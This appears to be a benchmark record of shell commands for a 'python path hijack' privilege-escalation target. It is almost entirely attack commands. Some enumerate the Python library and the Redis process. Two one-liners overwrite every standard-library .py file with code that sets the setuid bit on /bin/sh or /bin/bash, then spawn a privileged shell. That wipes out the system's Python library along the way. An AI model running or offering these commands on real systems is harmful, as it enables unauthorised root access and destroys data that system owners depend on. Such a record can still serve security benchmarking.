targets.name: Bench · python path hijack
commands: python3 -c "import os; print(os.listdir('/usr/lib/python3.14'))" && find / -name "python*" -exec ls -la {} \; 2>/dev/null | grep -v "/usr/lib/python3.14"

python3 -c 'import os; [open(os.path.join("/usr/lib/python3.14", f), "w").write("import os\nos.setuid(0)\nos.system(\"chmod +s /bin/sh\")") for f in os.listdir("/usr/lib/python3.14") if f.endswith(".py")]' && /bin/sh -p -c 'id'
redis-cli -h 127.0.0.1 -p 6379 INFO | grep "process_id" | awk -F: '{print $2}' | tr -d '\r' | xargs ps -up

python3 -c "import os; [open(os.path.join('/usr/lib/python3.14', f), 'w').write('import os\nos.system(\"chmod +s /bin/bash\")') for f in os.listdir('/usr/lib/python3.14') if f.endswith('.py')]" && /bin/bash -p -c 'id'
